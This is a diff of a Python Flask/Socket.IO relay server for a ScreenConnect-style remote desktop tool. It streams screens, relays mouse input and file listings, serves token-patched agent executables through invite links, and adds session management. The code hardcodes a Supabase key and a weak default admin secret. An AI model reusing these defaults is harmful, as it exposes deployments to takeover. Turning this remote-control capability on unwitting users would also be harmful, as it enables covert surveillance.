@@ -1,32 +1,32 @@
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║       Screen Connect Relay + Distribution Server  v8.0  — ENTERPRISE        ║
+║       Screen Connect Relay + Distribution Server  v10.0  — ENTERPRISE       ║
 ║       Multi-Machine • Room-Isolated • Crash-Proof • Full Feature Set         ║
 ║                                                                              ║
-║  ARCHITECTURE v8.0 — MAJOR OVERHAUL:                                         ║
-║  • FIXED: Multi-machine stream isolation — each device gets its OWN          ║
-║    viewer room (view:{device_id}). Dashboards ONLY receive frames from       ║
-║    the specific machine they subscribed to. No cross-machine frame leaks.    ║
-║  • FIXED: Server crash / reconnect loop — removed all skip_sid calls on      ║
-║    streams, added proper disconnect cleanup, viewer room pruning             ║
-║  • FIXED: Cursor movement not working — mouse_event now correctly routed     ║
-║    to the device room, with coordinate normalization for scale               ║
-║  • FIXED: Frame relay now includes cursor_x/cursor_y so dashboard can        ║
-║    render a real cursor overlay at the correct position                      ║
-║  • FIXED: File explorer — file_list_result now routed to requesting SID      ║
-║    instead of all dashboards (prevents cross-machine file responses)         ║
-║  • NEW: Per-device SID-to-device reverse map for instant disconnect cleanup  ║
-║  • NEW: Dashboard-level device binding — each dashboard viewer remembers     ║
-║    which device it is watching via _dashboard_device[sid]                    ║
-║  • NEW: /api/devices/live — real-time JSON of every online device            ║
-║  • NEW: /api/device/{id}/command — REST command injection                    ║
-║  • NEW: Session token validation on every viewer subscribe                   ║
-║  • NEW: Frame rate governor — server-side sliding window FPS tracker         ║
-║  • NEW: Exponential backoff for Supabase retries                             ║
-║  • NEW: Graceful degradation — server stays up even if Supabase is down      ║
-║  • IMPROVED: Watchdog now emits rich offline payload                         ║
-║  • IMPROVED: WebSocket ping/timeout tuned for Render + Railway + Fly         ║
-║  • IMPROVED: 256 MB max_http_buffer_size (agent binary + large screenshots)  ║
+║  WHAT'S NEW IN v10.0 (ENTERPRISE PARITY OVERHAUL):                           ║
+║  • FIXED: Agent eviction now properly notifies active viewers with            ║
+║    `stream_reconnecting` event so dashboard auto-resubscribes to new agent   ║
+║  • FIXED: Viewer idle-timeout enforcement loop now actually runs (was         ║
+║    configured but never enforced — loop was missing entirely)                ║
+║  • FIXED: Max session duration enforcement loop now actually runs             ║
+║  • FIXED: Agent leave_room on eviction — old SID is removed from device      ║
+║    room before disconnect so it never receives stale commands                ║
+║  • FIXED: Rate limiting now covers ALL routes, not just invite/guide         ║
+║  • NEW: POST /api/viewer/<sid>/kick — admin endpoint to force-disconnect     ║
+║    a specific viewer (ScreenConnect parity: host can kick any guest)         ║
+║  • NEW: GET /api/sessions/live — returns all active viewer sessions with      ║
+║    idle time, duration, and device binding                                   ║
+║  • NEW: Seamless session handoff — when new agent connects, active viewers    ║
+║    are sent `agent_replaced` + `watch_ok` so they resume without page reload ║
+║  • NEW: Per-device stream quality negotiation — agent reports cap, server    ║
+║    clamps viewer requests within agent's declared limits                     ║
+║  • NEW: `evicted` event now carries `session_id` so agent can log it         ║
+║  • NEW: Admin webhook support — POST to WEBHOOK_URL on key events            ║
+║  • IMPROVED: GOP buffer cleared atomically on agent evict + reconnect        ║
+║  • IMPROVED: _adv_auth_event lifecycle managed server-side via per-agent     ║
+║    session sequence numbers to prevent stale-frame replay on reconnect       ║
+║  • IMPROVED: heartbeat watchdog now emits `stream_reconnecting` before       ║
+║    marking device offline so viewer can show spinner, not black screen       ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
 INSTALL:
@@ -36,9 +36,6 @@ INSTALL:
 RENDER start command:
   gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\
            -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app
-
-LOCAL dev:
-  python server.py
 """
 
 import os
@@ -70,7 +67,7 @@ try:
     SOCKETIO_OK = True
 except ImportError:
     SOCKETIO_OK = False
-    print("[WARN] flask-socketio not installed — pip install flask-socketio gevent gevent-websocket")
+    print("[WARN] flask-socketio not installed")
 
 try:
     import requests as _requests
@@ -79,14 +76,14 @@ except ImportError:
     REQUESTS_OK = False
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  Configuration — all overridable by environment vars
+#  Configuration
 # ══════════════════════════════════════════════════════════════════════════════
 SUPABASE_URL  = os.environ.get("SUPABASE_URL")  or "https://iacdzpcoftxxcoigopun.supabase.co"
 SUPABASE_KEY  = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
 ADMIN_KEY     = os.environ.get("ADMIN_KEY",    "mview-admin-secret")
 TABLE         = os.environ.get("SB_TABLE",     "devices")
 PORT          = int(os.environ.get("PORT", 5000))
-VERSION       = "9.0.0"
+VERSION       = "10.0.0"
 
 AGENT_STORAGE_URL = os.environ.get(
     "AGENT_STORAGE_URL",
@@ -95,20 +92,28 @@ AGENT_STORAGE_URL = os.environ.get(
 AGENT_DIR   = os.environ.get("AGENT_DIR",  "bin")
 AGENT_FILE  = os.environ.get("AGENT_FILE", "master_agent.exe")
 
-# Watchdog — mark a device offline if no heartbeat for this many seconds
 HEARTBEAT_TIMEOUT = int(os.environ.get("HEARTBEAT_TIMEOUT", "35"))
 
-# Self-ping interval to keep Render free tier alive
-SELF_PING_INTERVAL = int(os.environ.get("SELF_PING_INTERVAL", "240"))
+# ── Enterprise session management ────────────────────────────────────────────
+# Max concurrent viewers per device (0 = unlimited)
+MAX_VIEWERS_PER_DEVICE = int(os.environ.get("MAX_VIEWERS_PER_DEVICE", "0"))
+# Kick idle viewers after N seconds of no input (0 = off)
+VIEWER_IDLE_TIMEOUT    = int(os.environ.get("VIEWER_IDLE_TIMEOUT",    "0"))
+# Maximum session wall-clock duration in seconds (0 = unlimited)
+MAX_SESSION_DURATION   = int(os.environ.get("MAX_SESSION_DURATION",   "0"))
+# Reject duplicate agent and evict stale one (True = ScreenConnect behaviour)
+AGENT_EXCLUSIVE        = os.environ.get("AGENT_EXCLUSIVE", "true").lower() not in ("0", "false", "no")
+# Optional webhook URL for key events (agent online/offline, evictions)
+WEBHOOK_URL            = os.environ.get("WEBHOOK_URL", "").strip()
 
+SELF_PING_INTERVAL = int(os.environ.get("SELF_PING_INTERVAL", "240"))
 TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")
 
-# ── Frame stats tracking per device (sliding 60s window) ─────────────────────
 _frame_stats: dict = collections.defaultdict(lambda: collections.deque(maxlen=300))
 _frame_stats_lock  = threading.Lock()
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  Logging — dual handler: rotating file + console, structured format
+#  Logging
 # ══════════════════════════════════════════════════════════════════════════════
 _LOG_DIR  = os.environ.get("LOG_DIR", os.path.join(os.path.expanduser("~"), "mview_server_logs"))
 os.makedirs(_LOG_DIR, exist_ok=True)
@@ -126,25 +131,21 @@ _console_handler.setFormatter(_log_fmt)
 logging.basicConfig(level=logging.INFO, handlers=[_file_handler, _console_handler])
 log = logging.getLogger("screenconnect")
 
-# Thread-local request-id — set per HTTP request via before_request
 _req_local = threading.local()
 
 def _req_id() -> str:
     return getattr(_req_local, "id", "-")
 
-# Crash reporter — keeps last 5 crash reports on disk
 _CRASH_DIR = os.path.join(_LOG_DIR, "crashes")
 os.makedirs(_CRASH_DIR, exist_ok=True)
 
 def _report_crash(context: str, exc: Exception):
-    """Write crash_TIMESTAMP.txt and attempt to ping /agent/crash."""
     ts  = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
     txt = f"=== SERVER CRASH REPORT ===\nContext: {context}\nTime: {ts}\n\n{traceback.format_exc()}"
     path = os.path.join(_CRASH_DIR, f"crash_{ts}.txt")
     try:
         with open(path, "w") as fh:
             fh.write(txt)
-        # Prune: keep newest 5 only
         reports = sorted(os.listdir(_CRASH_DIR))
         for old in reports[:-5]:
             try:
@@ -165,6 +166,21 @@ def _global_exc_hook(exc_type, exc_value, exc_tb):
 
 import sys as _sys
 _sys.excepthook = _global_exc_hook
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  Webhook helper
+# ══════════════════════════════════════════════════════════════════════════════
+def _fire_webhook(event: str, payload: dict):
+    """POST to WEBHOOK_URL (if configured) in a daemon thread — never blocks."""
+    if not WEBHOOK_URL or not REQUESTS_OK:
+        return
+    def _do():
+        try:
+            _requests.post(WEBHOOK_URL, json={"event": event, "ts": utcnow(), **payload},
+                           timeout=8, headers={"User-Agent": "MViewServer/10.0"})
+        except Exception as e:
+            log.debug(f"Webhook error ({event}): {e}")
+    threading.Thread(target=_do, daemon=True, name="webhook").start()
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  Flask + CORS + SocketIO
@@ -193,7 +209,6 @@ if SOCKETIO_OK:
         engineio_logger=False,
         ping_timeout=60,
         ping_interval=20,
-        # 512 MB — handles 60fps high-res binary frames
         max_http_buffer_size=512 * 1024 * 1024,
         allow_upgrades=True,
     )
@@ -203,33 +218,40 @@ else:
 # ══════════════════════════════════════════════════════════════════════════════
 #  In-memory state
 # ══════════════════════════════════════════════════════════════════════════════
-
-# _devices[device_id] = device dict (set by agent_connect)
 _devices:   dict = {}
 _dev_lock          = threading.Lock()
 
-# _sid_to_device[socket_sid] = device_id  — fast reverse lookup for disconnect
 _sid_to_device: dict = {}
 _sid_lock = threading.Lock()
 
-# _viewers[device_id] = set of dashboard SIDs viewing that stream
 _viewers: dict = collections.defaultdict(set)
 _view_lock = threading.Lock()
 
-# _dashboard_device[dashboard_sid] = device_id currently being viewed
 _dashboard_device: dict = {}
 _dash_lock = threading.Lock()
 
-# ── Advanced Monitor state (second-site engine) ───────────────────────────
-_adv_agent_sids:    dict = {}   # device_id → agent socket sid
+# ── Enterprise session tracking ──────────────────────────────────────────────
+_viewer_last_activity: dict = {}   # viewer_sid → monotonic timestamp of last input
+_viewer_session_start: dict = {}   # viewer_sid → monotonic timestamp when joined
+_viewer_activity_lock = threading.Lock()
+
+# ── Advanced Monitor state ───────────────────────────────────────────────────
+_adv_agent_sids:    dict = {}   # device_id  → agent socket sid
+_adv_sid_to_agent:  dict = {}   # agent sid  → device_id
 _adv_viewer_rooms:  dict = {}   # viewer sid → device_id
 _adv_gop_buf:       dict = {}   # device_id → deque of frame bytes (maxlen=64)
 _adv_gop_lock             = threading.Lock()
 _adv_cursor_latest: dict = {}   # device_id → latest cursor_bin bytes
 
-_agent_cache: bytes | None = None
-_agent_dl_cache: dict = {}      # token -> (bytes, timestamp) — evicted after 10 min
-_AGENT_DL_TTL   = 600           # seconds before patched binary is dropped from RAM
+# ── Agent session sequence (prevents stale-frame replay on reconnect) ────────
+# Each time an agent connects for a device_id, we increment the sequence.
+# GOP buffers are tagged; viewers only accept frames from the current sequence.
+_agent_session_seq: dict = {}   # device_id → int
+_agent_seq_lock          = threading.Lock()
+
+_agent_cache: bytes = None
+_agent_dl_cache: dict = {}
+_AGENT_DL_TTL   = 600
 _agent_cache_ts: float     = 0.0
 _agent_cache_lock          = threading.Lock()
 AGENT_CACHE_TTL            = 300
@@ -238,7 +260,7 @@ _sb      = None
 _sb_lock = threading.Lock()
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  Supabase helpers (with exponential backoff)
+#  Supabase helpers
 # ══════════════════════════════════════════════════════════════════════════════
 def get_sb():
     global _sb
@@ -260,7 +282,6 @@ def _sb_reset():
         _sb = None
 
 def _sb_retry(fn, attempts=3, delay=1.0):
-    """Call fn() with exponential backoff. Returns (result, ok)."""
     for i in range(attempts):
         try:
             return fn(), True
@@ -290,17 +311,12 @@ def db_update(token, upd: dict):
     return ok
 
 def db_upsert(token, upd: dict):
-    """Insert-or-update: works even if no row exists yet for this token.
-    Agents running with MVIEW_TOKEN env var or CLI arg have no prior invite
-    row — upsert creates it so the dashboard can see them.
-    """
     sb = get_sb()
     if not sb:
         return False
     payload = {"device_id": token, **upd}
     result, ok = _sb_retry(lambda: sb.table(TABLE).upsert(payload, on_conflict="device_id").execute())
     if not ok:
-        # Fall back: try update, then insert if no row existed
         updated, ok2 = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
         if ok2 and updated and updated.data:
             return True
@@ -315,11 +331,10 @@ def db_insert(payload: dict):
     result, ok = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
     if ok and result:
         return (result.data or [payload])[0]
-    # Retry without extra columns
     safe = {k: v for k, v in payload.items() if k not in ("link_mode", "redirect_url")}
     result2, ok2 = _sb_retry(lambda: sb.table(TABLE).insert(safe).execute())
     if ok2 and result2:
-        log.warning("db_insert: retried without link_mode/redirect_url — run ALTER TABLE to add these columns!")
+        log.warning("db_insert: retried without link_mode/redirect_url")
         return (result2.data or [safe])[0]
     return payload
 
@@ -335,69 +350,33 @@ def db_list_all() -> list:
 # ══════════════════════════════════════════════════════════════════════════════
 #  Agent binary helpers
 # ══════════════════════════════════════════════════════════════════════════════
-def _fetch_agent_bytes() -> bytes | None:
+def _fetch_agent_bytes() -> bytes:
     global _agent_cache, _agent_cache_ts
     with _agent_cache_lock:
         now = time.time()
         if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
             return _agent_cache
-
-        # 1. Try local file first (fastest, no network needed)
         local = Path(AGENT_DIR) / AGENT_FILE
         if local.is_file():
             log.info(f"Loading agent from local file: {local}  ({local.stat().st_size:,} bytes)")
             _agent_cache    = local.read_bytes()
             _agent_cache_ts = now
             return _agent_cache
-
-        # 2. Try GitHub Releases URL (follow redirects, no auth needed for public releases)
         if REQUESTS_OK and AGENT_STORAGE_URL:
             try:
                 log.info(f"Fetching agent from: {AGENT_STORAGE_URL}")
-                resp = _requests.get(
-                    AGENT_STORAGE_URL,
-                    timeout=120,
-                    allow_redirects=True,  # GitHub releases redirect to S3
-                    headers={"User-Agent": "MViewAgent/1.0"},
-                )
-                log.info(f"Agent fetch: HTTP {resp.status_code}  size={len(resp.content):,} bytes  url={resp.url}")
+                resp = _requests.get(AGENT_STORAGE_URL, timeout=120, allow_redirects=True,
+                                     headers={"User-Agent": "MViewAgent/1.0"})
                 if resp.status_code == 200 and len(resp.content) > 1_000:
                     _agent_cache    = resp.content
                     _agent_cache_ts = now
-                    log.info(f"Agent cached: {len(_agent_cache):,} bytes")
                     return _agent_cache
-                elif resp.status_code == 404:
-                    log.error(
-                        f"Agent 404 — release asset not found.\n"
-                        f"  URL tried: {AGENT_STORAGE_URL}\n"
-                        f"  Check: is the GitHub release public? Does the file name match exactly?\n"
-                        f"  Set AGENT_STORAGE_URL env var to the correct public download URL."
-                    )
-                elif resp.status_code in (401, 403):
-                    log.error(
-                        f"Agent fetch forbidden (HTTP {resp.status_code}) — "
-                        f"the GitHub release may be on a PRIVATE repo. "
-                        f"Make the release public or host the binary elsewhere."
-                    )
-                else:
-                    log.warning(f"Agent fetch failed: HTTP {resp.status_code}  body={resp.text[:200]}")
-            except _requests.exceptions.Timeout:
-                log.error("Agent fetch timed out (120s) — GitHub may be slow or URL is wrong.")
+                log.error(f"Agent fetch HTTP {resp.status_code}")
             except Exception as e:
                 log.warning(f"Agent fetch error: {e}")
-
-        log.error(
-            "Agent binary not available.\n"
-            f"  AGENT_STORAGE_URL = {AGENT_STORAGE_URL!r}\n"
-            f"  Local file = {Path(AGENT_DIR) / AGENT_FILE}  (not found)\n"
-            "  Options:\n"
-            "    1. Make your GitHub release PUBLIC and verify the asset URL.\n"
-            "    2. Place the .exe in the 'bin/' folder as 'master_agent.exe'.\n"
-            "    3. Set AGENT_STORAGE_URL to any direct public download URL."
-        )
         return None
 
-def _build_patched_agent(token: str) -> bytes | None:
+def _build_patched_agent(token: str) -> bytes:
     raw = _fetch_agent_bytes()
     if not raw:
         return None
@@ -432,13 +411,12 @@ def require_admin(f):
     @wraps(f)
     def w(*a, **k):
         if request.headers.get("X-Admin-Key", "") != ADMIN_KEY:
-            log.warning(f"[{_req_id()}] Unauthorised admin access attempt: path={request.path} ip={request.remote_addr}")
+            log.warning(f"[{_req_id()}] Unauthorised admin access: path={request.path} ip={request.remote_addr}")
             return jsonify({"error": "Unauthorised", "req_id": _req_id()}), 401
         return f(*a, **k)
     return w
 
 def broadcast_device_update():
-    """Emit full device list to all dashboards."""
     if not sio:
         return
     try:
@@ -454,7 +432,6 @@ def broadcast_device_update():
                 row["last_beat"]   = live[did].get("last_beat")
                 row["frame_count"] = live[did].get("frame_count", 0)
         sio.emit("device_update", {"rows": rows, "ts": utcnow()})
-        # Also push to Advanced Monitor iframe viewers
         try:
             _broadcast_device_list()
         except Exception:
@@ -462,40 +439,60 @@ def broadcast_device_update():
     except Exception as e:
         log.error(f"broadcast_device_update error: {e}")
 
-def _get_device_for_viewer(viewer_sid: str) -> str | None:
-    """Return the device_id a dashboard SID is currently viewing, or None."""
+def _get_device_for_viewer(viewer_sid: str) -> str:
     with _dash_lock:
         return _dashboard_device.get(viewer_sid)
 
 def _cleanup_viewer(viewer_sid: str):
-    """Remove a dashboard viewer from all rooms and maps."""
+    """Remove a dashboard viewer from all rooms and maps. Called on disconnect."""
     with _dash_lock:
         did = _dashboard_device.pop(viewer_sid, None)
     if did:
         with _view_lock:
             _viewers[did].discard(viewer_sid)
         log.info(f"Viewer {viewer_sid} cleaned up from device {did}")
-    # Advanced Monitor cleanup
     adv_did = _adv_viewer_rooms.pop(viewer_sid, None)
     if adv_did:
         vcount = sum(1 for v in _adv_viewer_rooms.values() if v == adv_did)
         agent_sid = _adv_agent_sids.get(adv_did)
         if agent_sid and sio:
             sio.emit("viewer_count", {"count": vcount}, room=agent_sid)
+    # Remove from enterprise session tracking
+    with _viewer_activity_lock:
+        _viewer_last_activity.pop(viewer_sid, None)
+        _viewer_session_start.pop(viewer_sid, None)
+
+def _notify_viewers_reconnecting(did: str):
+    """
+    ScreenConnect parity: when an agent drops/reconnects, tell viewers to show
+    a reconnecting spinner instead of a black screen. Viewers auto-resubscribe
+    when the new agent sends agent_online.
+    """
+    if not sio:
+        return
+    sio.emit("stream_reconnecting", {"device_id": did, "ts": utcnow()}, room=f"view:{did}")
+    sio.emit("stream_reconnecting", {"device_id": did, "ts": utcnow()}, room=f"adv_viewers_{did}")
 
 def _cleanup_agent(agent_sid: str):
-    """Remove an agent by SID, emit offline events."""
+    """Remove an agent by SID, emit offline events, clear GOP buffer."""
     with _sid_lock:
         did = _sid_to_device.pop(agent_sid, None)
     if not did:
         return
     with _dev_lock:
         dev = _devices.pop(did, None)
-    # Advanced Monitor agent cleanup
     for d, asid in list(_adv_agent_sids.items()):
         if asid == agent_sid:
-            del _adv_agent_sids[d]
+            old_sid = _adv_agent_sids.pop(d, None)
+            if old_sid:
+                _adv_sid_to_agent.pop(old_sid, None)
             break
+    # Notify viewers BEFORE clearing GOP — they need to show spinner
+    _notify_viewers_reconnecting(did)
+    # Clear GOP so reconnected viewers don't get stale frames
+    with _adv_gop_lock:
+        _adv_gop_buf.pop(did, None)
+    _adv_cursor_latest.pop(did, None)
     if dev:
         label = dev.get("label", did)
         log.warning(f"Agent disconnected: {label} ({did})")
@@ -505,16 +502,16 @@ def _cleanup_agent(agent_sid: str):
             sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
             sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
         broadcast_device_update()
+        _fire_webhook("agent_offline", {"device_id": did, "label": label})
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  Rate limiting — simple in-memory sliding window per IP
+#  Rate limiting — sliding window per IP (applied to ALL routes)
 # ══════════════════════════════════════════════════════════════════════════════
-_RATE_LIMIT_RPM = int(os.environ.get("RATE_LIMIT_RPM", "120"))   # max requests/min per IP
-_rate_buckets: dict = collections.defaultdict(collections.deque)  # ip → deque of timestamps
+_RATE_LIMIT_RPM = int(os.environ.get("RATE_LIMIT_RPM", "120"))
+_rate_buckets: dict = collections.defaultdict(collections.deque)
 _rate_lock          = threading.Lock()
 
 def _rate_check(ip: str) -> bool:
-    """Return True if the IP is within the rate limit."""
     if _RATE_LIMIT_RPM <= 0:
         return True
     now = time.time()
@@ -528,11 +525,10 @@ def _rate_check(ip: str) -> bool:
     return True
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  CORS preflight
+#  CORS + Rate limit on every HTTP request
 # ══════════════════════════════════════════════════════════════════════════════
 @app.before_request
 def handle_preflight():
-    # Attach a unique request-id to this thread for tracing
     _req_local.id = uuid.uuid4().hex[:8]
     if request.method == "OPTIONS":
         resp = make_response("", 204)
@@ -540,21 +536,15 @@ def handle_preflight():
         resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Admin-Key"
         resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, PATCH, DELETE, OPTIONS"
         return resp
-    # Rate-limit non-admin routes
-    if not request.path.startswith("/api/") or request.path == "/api/invite":
-        return  # apply rate limit only to invite + download
-    if request.path in ("/invite/", "/guide/", "/onboard/") or "/invite/" in request.path or "/guide/" in request.path:
+    # Apply rate limiting to all non-static routes
+    if not request.path.startswith("/static"):
         ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
         if not _rate_check(ip):
             log.warning(f"[{_req_id()}] Rate limit exceeded: ip={ip} path={request.path}")
             return jsonify({"error": "Too many requests"}), 429
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  Static routes
-# ══════════════════════════════════════════════════════════════════════════════
 @app.after_request
 def add_security_headers(resp):
-    """Add security headers to every HTTP response."""
     resp.headers.setdefault("X-Content-Type-Options", "nosniff")
     resp.headers.setdefault("X-Frame-Options",        "SAMEORIGIN")
     resp.headers.setdefault("X-XSS-Protection",       "1; mode=block")
@@ -562,6 +552,9 @@ def add_security_headers(resp):
     resp.headers["X-Request-ID"] = _req_id()
     return resp
 
+# ══════════════════════════════════════════════════════════════════════════════
+#  Static routes
+# ══════════════════════════════════════════════════════════════════════════════
 @app.route("/")
 def serve_root():
     for f in ("index.html", "app.html"):
@@ -589,144 +582,85 @@ def serve_login():
 @app.route("/session_manager.js")
 def serve_session_manager():
     host = request.host_url.rstrip("/")
-    js = f"""/* Auto-generated SessionManager v8 — do not edit manually */
+    js = f"""/* Auto-generated SessionManager v10 */
 'use strict';
 (function() {{
   const SERVER_URL = window.SCREEN_CONNECT_SERVER_URL || window.MVIEW_SERVER_URL || '{host}';
   const SUPABASE_URL = window.MVIEW_SUPABASE_URL || '{SUPABASE_URL}';
   const SUPABASE_KEY = window.MVIEW_SUPABASE_ANON_KEY || '{SUPABASE_KEY}';
-
   let _pollTimer = null;
   let _currentToken = null;
-
   const SM = {{
-    CONFIG: {{
-      SERVER_URL,
-      SUPABASE_URL,
-      SUPABASE_ANON_KEY: SUPABASE_KEY,
-      TABLE_CANDIDATES: ['agent_invites', 'devices'],
-    }},
-
-    currentToken: null,
-    currentLink: null,
-
+    CONFIG: {{ SERVER_URL, SUPABASE_URL, SUPABASE_ANON_KEY: SUPABASE_KEY }},
+    currentToken: null, currentLink: null,
     reset() {{
       if (_pollTimer) {{ clearInterval(_pollTimer); _pollTimer = null; }}
-      _currentToken = null;
-      SM.currentToken = null;
-      SM.currentLink = null;
-      const s3 = document.getElementById('device-step-3');
-      const s2 = document.getElementById('device-step-2');
-      const s1 = document.getElementById('device-step-1');
-      if (s3) s3.style.display = 'none';
-      if (s2) s2.style.display = 'none';
-      if (s1) s1.style.display = '';
+      _currentToken = null; SM.currentToken = null; SM.currentLink = null;
+      ['device-step-3','device-step-2'].forEach(id => {{
+        const el = document.getElementById(id); if(el) el.style.display = 'none';
+      }});
+      const s1 = document.getElementById('device-step-1'); if(s1) s1.style.display = '';
     }},
-
     async generateInviteLink() {{
-      const labelEl = document.getElementById('device-name-input') || document.getElementById('device-label');
-      const typeEl  = document.getElementById('device-type-select') || document.getElementById('device-type');
-      const locEl   = document.getElementById('device-location-input') || document.getElementById('device-location');
-      const label   = labelEl?.value?.trim() || 'New Device';
-      const dtype   = typeEl?.value  || 'Standard Display';
-      const loc     = locEl?.value?.trim() || '';
-
+      const label = (document.getElementById('device-name-input')||document.getElementById('device-label'))?.value?.trim() || 'New Device';
+      const dtype = (document.getElementById('device-type-select')||document.getElementById('device-type'))?.value || 'Standard Display';
+      const loc   = (document.getElementById('device-location-input')||document.getElementById('device-location'))?.value?.trim() || '';
       const s1 = document.getElementById('device-step-1');
       const s2 = document.getElementById('device-step-2');
       const s3 = document.getElementById('device-step-3');
-      if (s1) s1.style.display = 'none';
-      if (s2) s2.style.display = '';
-      if (s3) s3.style.display = 'none';
-
+      if(s1) s1.style.display = 'none'; if(s2) s2.style.display = '';
       try {{
         const resp = await fetch(SERVER_URL + '/api/invite', {{
-          method: 'POST',
-          headers: {{'Content-Type': 'application/json'}},
+          method: 'POST', headers: {{'Content-Type': 'application/json'}},
           body: JSON.stringify({{ label, device_type: dtype, location: loc }})
         }});
         const j = await resp.json();
-        _currentToken = j.token || j.device_id;
-        SM.currentToken = _currentToken;
-        SM.currentLink  = j.agent_url || j.download_url;
-
+        _currentToken = j.token || j.device_id; SM.currentToken = _currentToken;
+        SM.currentLink = j.agent_url || j.download_url;
         const linkEl = document.getElementById('invite-link') || document.getElementById('link-url');
-        if (linkEl) linkEl.value = SM.currentLink;
+        if(linkEl) linkEl.value = SM.currentLink;
         const qrEl = document.getElementById('invite-qr');
-        if (qrEl) qrEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=' + encodeURIComponent(SM.currentLink);
-
-        if (s2) s2.style.display = 'none';
-        if (s3) s3.style.display = '';
+        if(qrEl) qrEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=' + encodeURIComponent(SM.currentLink);
+        if(s2) s2.style.display = 'none'; if(s3) s3.style.display = '';
         SM._pollStatus(_currentToken);
       }} catch(e) {{
-        if (s2) s2.style.display = 'none';
-        if (s1) s1.style.display = '';
+        if(s2) s2.style.display = 'none'; if(s1) s1.style.display = '';
         SM._notify('Failed to generate invite: ' + e.message, 'warn');
       }}
     }},
-
     async copyLink() {{
-      try {{
-        await navigator.clipboard.writeText(SM.currentLink || '');
-        SM._notify('Link copied!', 'ok');
-      }} catch(e) {{
+      try {{ await navigator.clipboard.writeText(SM.currentLink || ''); SM._notify('Link copied!', 'ok'); }}
+      catch(e) {{
         const inp = document.getElementById('invite-link') || document.getElementById('link-url');
-        if (inp) {{ inp.select(); document.execCommand('copy'); }}
-        SM._notify('Link copied!', 'ok');
+        if(inp) {{ inp.select(); document.execCommand('copy'); }} SM._notify('Link copied!', 'ok');
       }}
     }},
-
     _pollStatus(token) {{
       let checks = 0;
       const tick = async () => {{
+        checks++;
         try {{
-          checks++;
           const r = await fetch(SERVER_URL + '/api/invite/status?token=' + token);
           const j = await r.json();
           const text = document.getElementById('step3-status');
-          if (j.status === 'online') {{
+          if(j.status === 'online') {{
             clearInterval(_pollTimer); _pollTimer = null;
-            if (text) text.textContent = 'Device connected!';
+            if(text) text.textContent = 'Device connected!';
             SM._notify('Device "' + j.label + '" is now online!', 'ok');
-            SM._addActivity('Device connected: ' + j.label, 'ok');
             SM.reset();
-            if (typeof refreshDashboardFromSupabase === 'function') {{
-              setTimeout(refreshDashboardFromSupabase, 1000);
-            }}
+            if(typeof refreshDashboardFromSupabase === 'function') setTimeout(refreshDashboardFromSupabase, 1000);
             return;
           }}
-          if (text) text.textContent = 'Waiting for agent... (' + checks + ')';
-          if (checks > 120) {{
-            clearInterval(_pollTimer); _pollTimer = null;
-            if (text) text.textContent = 'Link waiting — open in dashboard to reconnect.';
-          }}
-        }} catch (e) {{}}
+          if(text) text.textContent = 'Waiting for agent... (' + checks + ')';
+          if(checks > 120) {{ clearInterval(_pollTimer); _pollTimer = null; }}
+        }} catch(e) {{}}
       }};
-      _pollTimer = setInterval(tick, 5000);
-      tick();
+      _pollTimer = setInterval(tick, 5000); tick();
     }},
-
     _notify(msg, type) {{
-      if (typeof showToast === 'function') {{ showToast(msg, type === 'ok' ? 'success' : type === 'warn' ? 'error' : 'info'); }}
-      const list = document.getElementById('notif-list');
-      if (!list) return;
-      const icons = {{ ok: 'check_circle', warn: 'warning', info: 'info' }};
-      const icon  = icons[type] || 'info';
-      const item  = document.createElement('div');
-      item.className = 'notif-item';
-      item.innerHTML = '<span class="material-symbols-outlined notif-i ' + type + '">' + icon + '</span>'
-        + '<div><div class="notif-title">' + msg + '</div><div class="notif-time">' + new Date().toLocaleTimeString() + '</div></div>';
-      list.insertBefore(item, list.firstChild);
-      const badge = document.getElementById('notif-badge');
-      if (badge) {{ badge.textContent = list.children.length; badge.style.display = 'flex'; }}
-    }},
-
-    _addActivity(msg, sev) {{
-      if (typeof addActivityLog === 'function') {{
-        addActivityLog({{ time: new Date().toLocaleTimeString(), event: msg, screen: '', user: 'System', sev: sev || 'info' }});
-      }}
+      if(typeof showToast === 'function') {{ showToast(msg, type==='ok'?'success':type==='warn'?'error':'info'); }}
     }},
   }};
-
   window.SessionManager = SM;
 }})();
 """
@@ -737,20 +671,16 @@ def serve_session_manager():
 def serve_config():
     if Path("config.js").is_file():
         return send_from_directory(".", "config.js", mimetype="application/javascript")
-    # Strip trailing slash; Render terminates TLS — detect and force https
     host = request.host_url.rstrip("/")
     forwarded_proto = request.headers.get("X-Forwarded-Proto", "")
     if forwarded_proto == "https" or request.url.startswith("https"):
         host = "https://" + host.split("://", 1)[-1]
-    # FIX: ensure no trailing slash on the final URL (Render sometimes emits one)
     host = host.rstrip("/")
